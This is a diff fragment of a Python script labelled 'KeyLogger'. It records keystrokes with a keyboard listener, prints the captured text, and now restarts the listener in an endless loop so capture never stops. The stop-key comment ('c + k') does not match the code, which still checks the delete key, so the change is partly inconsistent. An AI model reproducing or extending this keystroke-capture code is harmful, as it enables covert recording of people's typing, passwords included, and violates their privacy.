@@ -30,36 +30,22 @@ def on_release(key):
             output_text = "".join(input_keys)
             print_text(output_text)
             print_text(memory)
-        ###     press "c + delete" to stop monitoring       ###
-        elif key == keyboard.Key.delete and input_keys[-2] == 'c':
+        ###     press "c + k" to stop monitoring       ###
+        elif key == keyboard.Key.delete and input_keys[-2] == 'k':
                 return False
         else:
-            pass
+            return False
     except:
         pass
 
 ###     keyboard listener      ###
-def run_listener():
+def listener():
     with keyboard.Listener(on_press=on_press,on_release=on_release) as listener:
         listener.join()
-
-
-###     listen any time     ###
-def run_listener_forever():
-    while True:
-        l = Process(target=run_listener())
-        l.start()
-        l.join()
-        l.terminate()
-
-
-
-
-
 
 
 
 ### run KeyLogger       ###
 if __name__ == '__main__':
-
-    run_listener_forever()
+    while True:
+        listener()
